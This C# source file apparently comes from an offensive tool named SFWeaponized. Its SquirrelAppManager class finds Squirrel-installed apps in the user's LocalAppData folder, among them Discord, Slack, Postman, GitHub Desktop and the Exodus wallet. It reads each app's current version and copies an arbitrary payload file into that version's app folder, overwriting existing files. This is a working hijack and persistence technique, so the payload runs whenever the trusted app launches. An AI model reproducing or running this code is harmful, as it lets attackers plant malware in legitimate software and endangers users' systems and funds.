using SFWeaponized.Model;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;

namespace SFWeaponized
{
    internal class SquirrelAppManager
    {
        private static readonly string _localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        private readonly List<string> _directories = new List<string>
        {
            "GitHubDesktop",
            "Discord",
            "Postman",
            "atom",
            "slack",
            "exodus",
            "figma",
            "insomnia"
        };

        public string PayloadPath { get; set; }
        public List<SquirrelApp> AppList {  get; set; }

        public SquirrelAppManager(string payloadPath) 
        {
            PayloadPath = payloadPath;
            AppList = new List<SquirrelApp>();
        }

        public void StartSearch()
        {
            if (!File.Exists(PayloadPath))
                return;

            foreach (string directory in _directories)
            {
                string fullPath = Path.Combine(_localAppData, directory);

                if (Directory.Exists(fullPath))
                {
                    SquirrelApp tempApp = new SquirrelApp(directory, fullPath, GetIconPath(fullPath), GetVersion(fullPath));
                    AppList.Add(tempApp);

                    CopyPayloadToDestiny(fullPath, tempApp.CurrentVersion);
                }
            }
        }

        private void CopyPayloadToDestiny(string fullPath, string version)
        {
            if (string.IsNullOrEmpty(version))
                return;

            string appDirectory = Path.Combine(fullPath, $"app-{version}");

            if (Directory.Exists(appDirectory))
                File.Copy(PayloadPath, Path.Combine(appDirectory, Path.GetFileName(PayloadPath)), true);
        }

        private string GetIconPath(string fullPath)
        {
            string[] files = Directory.GetFiles(fullPath, "*.ico", SearchOption.AllDirectories);

            if (files.Length != 0)
                return files.First();

            return string.Empty;
        }

        private string GetVersion(string fullPath)
        {
            string releasesFilePath = Path.Combine(fullPath, "packages", "RELEASES");

            if (File.Exists(releasesFilePath))
            {
                string content = File.ReadAllText(releasesFilePath);

                string pattern = @"\d+(\.\d+)+";
                Match match = Regex.Match(content, pattern);

                if (match.Success)
                    return match.Value;
            }

            return string.Empty;
        }
    }
}
